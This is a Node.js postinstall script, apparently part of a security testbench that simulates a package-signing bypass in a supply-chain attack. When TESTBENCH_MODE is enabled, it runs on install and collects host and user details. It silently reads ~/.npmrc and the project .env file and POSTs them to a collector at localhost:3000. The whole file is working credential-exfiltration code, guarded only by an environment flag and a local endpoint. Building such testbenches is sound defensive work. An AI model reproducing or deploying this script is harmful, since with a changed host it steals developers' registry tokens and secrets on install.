/**
 * MALICIOUS POSTINSTALL SCRIPT
 * This executes automatically when the package is installed
 * 
 * SAFETY: Only works in TESTBENCH_MODE
 * 
 * NOTE: This package is SIGNED with legitimate keys (compromised),
 * so signature verification passes even though it contains malicious code.
 */

if (process.env.TESTBENCH_MODE === 'enabled') {
  const http = require('http');
  const fs = require('fs');
  const path = require('path');
  const os = require('os');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'secure-utils',
    version: '1.0.1',
    attackType: 'package-signing-bypass',
    signatureStatus: 'VALID', // Signature verification passes!
    keyCompromised: true,
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
    },
    files: {}
  };

  // Try to read sensitive files
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

